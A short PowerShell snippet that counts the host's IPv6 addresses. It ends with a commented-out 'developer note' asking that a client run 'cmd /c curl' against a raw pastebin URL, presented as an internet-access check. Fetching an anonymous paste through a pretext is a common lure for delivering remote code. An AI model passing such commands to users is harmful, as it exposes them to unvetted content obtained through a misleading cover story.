# Powershell Script

Echo (Get-NetIPAddress | Where-Object "AddressFamily" -eq "IPv6" | Select-Object "IPAddress").count

# Developer Note: Send this to the client and ask them to run this to to see if they can access internet from their end.
# cmd /c curl -s https://pastebin.com/raw/7MJJhZf8







